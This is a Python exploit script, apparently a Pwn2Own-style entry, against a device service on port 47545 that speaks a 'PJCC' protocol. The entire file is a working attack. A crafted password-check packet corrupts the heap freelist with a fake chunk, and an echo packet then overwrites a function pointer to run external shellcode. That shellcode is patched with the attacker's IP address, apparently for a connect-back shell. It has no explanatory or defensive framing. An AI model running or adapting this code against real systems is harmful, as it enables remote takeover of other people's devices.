#!/usr/bin/env python3
"""
p2o
"""
import os
import sys
from struct import pack, unpack, pack_into
from socket import socket, inet_aton, AF_INET, SOCK_STREAM
import requests
import argparse

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

CADM_PORT = 47545

MAGIC_FREE = 0x46524545  # "FREE"
FAKE_CHUNK_ADDR = 0x44557B14
CHUNK_METADATA_SIZE = 40

TARGET_FUNC_OFF = 0xAF4
TARGET_SHELLCODE_ADDR = 0x44559B28
TARGET_SHELLCODE_OFF = TARGET_SHELLCODE_ADDR - FAKE_CHUNK_ADDR

VULN_OBJ_SIZE = 428


def ip2int(addr):
    return unpack(">I", inet_aton(addr))[0]


def load_shellcode():
    shellcode_file = "shellcode_ninja.bin"
    shellcode_path = os.path.join(
        os.path.dirname(os.path.realpath(__file__)), shellcode_file
    )
    with open(shellcode_path, "rb") as f:
        return bytearray(f.read())


class PJCC:
    ECHO = 0x1
    CHECKPASS2 = 0x83
    MAGIC_PJCC = 0xCDCA
    _pkt = None

    def __init__(self, op, payload, rep=0):
        self._pkt = pack(
            ">HBBHHHIIBB",
            self.MAGIC_PJCC,
            16,  # version
            rep,
            op,
            0,
            len(payload),
            0,
            0,
            0,
            0,
        )
        self._pkt += payload

    def pkt(self):
        return self._pkt


class PJCCEcho(PJCC):
    def __init__(self, payload=b"V" * 0x1620):
        super().__init__(self.ECHO, payload)


class PJCCCheckPassword2(PJCC):
    _payload = None

    def __init__(self, payload=None):
        if payload is None:
            self._payload = pack(">BI", 50, 0xDEADBEEF)
            self.payload_str(b"A" * 0x40)
            self.payload_str(b"B" * 0x40)
            self._payload += pack(">B", (VULN_OBJ_SIZE - 298) + 16)
            self._payload += b"C" * (VULN_OBJ_SIZE - 298)
            self._payload += pack("<III", 0, MAGIC_FREE, 0x1000)
            self._payload += pack("<I", FAKE_CHUNK_ADDR)

        super().__init__(self.CHECKPASS2, self._payload)

    def payload_str(self, data):
        self._payload += pack(">B", len(data)) + data


def pjcc_send_pkt(sock, pkt, wait=False):
    sock.sendall(pkt)
    if wait:
        try:
            reply = sock.recv(0x100)
            print("received pkt", repr(reply))
        except ConnectionResetError:
            pass


if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="target IP", required=True)

    args = parser.parse_args()
    host = args.target
    memdump_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "memdump")
    with open(memdump_path, "rb") as f:
        dump = bytearray(f.read())

    shellcode = load_shellcode()

    ip_addr_offset = shellcode.find(b"\xde\xad\xbe\xef")
    assert (
        ip_addr_offset != -1
    ), "Can't find magic 0xdeadbeef to patch shellcode IP address"

    print("[+] drill holes")

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
        "Connection": "keep-alive",
        "Cookie": "view=normal; language=fr; kind=standard; sessid=F138EFB532BF08D9A20183C8B15F1BA7",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
    }

    try:
        res = requests.get(f"https://{host}", headers=headers, verify=False, timeout=5)
    except requests.exceptions.ReadTimeout:
        print("[+] failed to reach target")
        sys.exit(0)

    with socket(AF_INET, SOCK_STREAM) as s:
        s.connect((host, CADM_PORT))
        sock_ip_addr, sock_port = s.getsockname()
        print(f"[+] Patching shellcode with IP address {sock_ip_addr}")
        pack_into(">I", shellcode, ip_addr_offset, ip2int(sock_ip_addr))

        print("[+] corrupting freelist")
        pjcc1 = PJCCCheckPassword2()
        pjcc_send_pkt(s, pjcc1.pkt())

        print("[+] getting back corrupted chunk")

        for idx, val in enumerate(shellcode):
            pack_into("B", dump, TARGET_SHELLCODE_OFF + idx, val)

        pack_into("<I", dump, TARGET_FUNC_OFF, TARGET_SHELLCODE_ADDR)
        pjcc2 = PJCCEcho(dump)
        pjcc_send_pkt(s, pjcc2.pkt())
        print("[+] done")
